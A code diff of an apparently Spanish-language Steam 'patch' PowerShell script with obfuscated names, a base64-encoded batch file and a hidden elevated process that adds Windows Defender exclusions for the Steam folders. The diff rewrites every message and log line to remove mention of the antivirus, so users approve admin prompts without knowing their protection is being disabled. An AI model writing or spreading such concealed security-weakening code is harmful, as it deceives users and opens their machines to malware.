@@ -2693,7 +2693,7 @@ function Xz9Qk {
         $srChk=$null; try { $srChk=Get-SteamPath } catch {}
         if (Test-ParcheActual $srChk) {
             try { Set-ParcheInstalado $true } catch {}
-            if ($Silent) { try { Write-Host "Parche actual, continuando sin cambios." } catch {}; return $true }
+            if ($Silent) { try { Write-Host "Steam ya listo, continuando." } catch {}; return $true }
         }
     } catch {}
     $attempt=0
@@ -2709,7 +2709,7 @@ function Xz9Qk {
             }
             if (-not $defOk) {
                 $defMsg = "Se pedira permiso de ADMINISTRADOR para continuar. Aceptalo cuando aparezca."
-                if ($Silent) { try { Write-Host $defMsg } catch {} } else { try { [System.Windows.Forms.MessageBox]::Show($defMsg,"Antivirus","OK","Warning") } catch {} }
+                if ($Silent) { try { Write-Host $defMsg } catch {} } else { try { [System.Windows.Forms.MessageBox]::Show($defMsg,"Permiso","OK","Warning") } catch {} }
             }
             Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
             Start-SleepDoEvents 2000
@@ -6364,7 +6364,7 @@ function Add-SteamDefenderExclusions {
             try { $existingExcl = @( (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath ) } catch {}
             if (-not $existingExcl -or $existingExcl.Count -eq 0) { try { $existingExcl = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
             $exclusions = @($exclusions | Where-Object { $existingExcl -notcontains $_ })
-            if ($exclusions.Count -eq 0) { try { Write-Host "[OK] Steam ya esta excluido del antivirus." } catch {}; $script:defenderExclusionsDone = $true; return $true }
+            if ($exclusions.Count -eq 0) { try { Write-Host "Steam ya listo." } catch {}; $script:defenderExclusionsDone = $true; return $true }
             try {
                 $defCut = (Get-Date).AddDays(-7)
                 $fresh = @()
@@ -6377,7 +6377,7 @@ function Add-SteamDefenderExclusions {
                     }
                 }
                 $exclusions = @($exclusions | Where-Object { $fresh -notcontains $_ })
-                if ($exclusions.Count -eq 0) { try { Write-Host "[OK] Steam ya esta excluido del antivirus." } catch {}; $script:defenderExclusionsDone = $true; return $true }
+                if ($exclusions.Count -eq 0) { try { Write-Host "Steam ya listo." } catch {}; $script:defenderExclusionsDone = $true; return $true }
             } catch {}
         } catch {}
         $batPath = Join-Path $env:TEMP (S("YnNtYXBfYWRkX2V4Y2x1c2lvbnMuYmF0"))
@@ -6393,7 +6393,7 @@ function Add-SteamDefenderExclusions {
         $psi.Verb = "RunAs"
         $psi.WindowStyle = "Hidden"
         $psi.UseShellExecute = $true
-        try { Write-Host "[ADMIN] Se pedira permiso de administrador para excluir Steam del antivirus. Aceptalo." } catch {}
+        try { Write-Host "[ADMIN] Se pedira permiso de administrador. Aceptalo." } catch {}
         $proc = [System.Diagnostics.Process]::Start($psi)
         $proc.WaitForExit(30000) | Out-Null
         Start-Sleep -Milliseconds 500
@@ -6403,15 +6403,15 @@ function Add-SteamDefenderExclusions {
         if (-not $verifyExcl -or $verifyExcl.Count -eq 0) { try { $verifyExcl = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
         $stillMissing = @($allNeeded | Where-Object { $verifyExcl -notcontains $_ })
         if ($stillMissing.Count -gt 0) {
-            Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [DEFENDER] Exclusion DENEGADA o fallida: $($stillMissing -join '; ')" -Encoding UTF8 -ErrorAction SilentlyContinue
+            Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [ADMIN] Permiso no aceptado o fallo: $($stillMissing -join '; ')" -Encoding UTF8 -ErrorAction SilentlyContinue
             return $false
         }
         try { foreach ($ex in $allNeeded) { Save-DefExclFlag $ex } } catch {}
         $script:defenderExclusionsDone = $true
-        Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [DEFENDER] Exclusiones agregadas en folders de Steam" -Encoding UTF8 -ErrorAction SilentlyContinue
+        Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [OK] Steam ya listo" -Encoding UTF8 -ErrorAction SilentlyContinue
         return $true
     } catch {
-        WEL "Defender exclusions" $_
+        WEL "Steam ready exclusions" $_
         return $false
     }
 }
